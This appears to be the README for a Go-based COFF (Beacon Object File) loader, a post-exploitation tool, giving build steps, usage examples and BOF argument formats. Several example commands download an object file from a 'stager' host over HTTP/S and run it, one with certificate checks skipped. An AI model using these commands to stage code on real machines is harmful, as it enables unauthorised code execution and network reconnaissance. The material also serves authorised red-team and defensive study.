Go COFF loader.

## Build

Build on Windows:

```powershell
make build
```

## Usage

```powershell
# load from a file with a custom entry point
.\gol.exe --file .\whoami.x64.o --entry go

# load from a URL via HTTP/S
.\gol.exe --url http://stager:8080/somebof.o
.\gol.exe --url https://stager:8080/somebof.o --insecure-skip-verify

# run in verbose mode with some extra debug information
.\gol.exe --url http://stager:8080/somebof.o --verbose

# provide arguments to a COFF
.\gol.exe --file .\probe.x64.o --arg DC1 --arg 88
```

## BOF Arguments

Use `--arg` for ordinary arguments. Repeat it for multiple values.

```powershell
.\gol.exe --file .\hostname.x64.o --arg dc01
.\gol.exe --file .\lookup.x64.o --arg dc01 --arg alice
.\gol.exe --file .\probe.x64.o --arg google.com --arg 443
```

Some BOFs expect non-string values through `BeaconDataInt`,
`BeaconDataShort`, UTF-16 strings, or raw bytes. For those cases use the
advanced `--bof-format` flag with one repeated `--bof-arg` per format
character.

Supported format characters:

- `z`: null-terminated string for `BeaconDataExtract`
- `Z`: null-terminated UTF-16LE string for `BeaconDataExtract`
- `i`: signed 32-bit integer for `BeaconDataInt`
- `s`: signed 16-bit integer for `BeaconDataShort`
- `b`: base64-decoded bytes for `BeaconDataExtract`
